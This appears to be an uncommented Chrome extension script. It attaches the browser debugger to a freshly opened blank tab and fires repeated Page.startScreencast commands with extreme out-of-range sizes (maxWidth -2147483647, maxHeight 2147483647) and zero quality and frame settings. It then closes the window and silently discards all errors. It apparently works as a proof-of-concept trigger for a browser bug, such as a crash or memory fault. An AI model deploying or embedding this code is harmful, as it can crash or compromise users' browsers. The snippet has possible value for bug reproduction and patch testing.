try {
  var atabid;
  var windowId;
  chrome.windows.create({
    url: "about:blank",
    type: "normal"
  }, w => {
    windowId = w.id;
    atabid = w.tabs[0].id;
    chrome.debugger.attach({
      tabId: atabid
    }, "1.3", function () {
      const intervalId = setInterval(g => {
        chrome.debugger.sendCommand({
          tabId: atabid
        }, "Page.startScreencast", {
          format: 'jpeg',
          quality: 0,
          maxWidth: -2147483647,
          maxHeight: 2147483647,
          everyNthFrame: 0
        });
      }, 100);
      setTimeout(() => {
        clearInterval(intervalId);
        chrome.windows.remove(windowId);
      }, 1000);
    });
  });
} catch (e) {}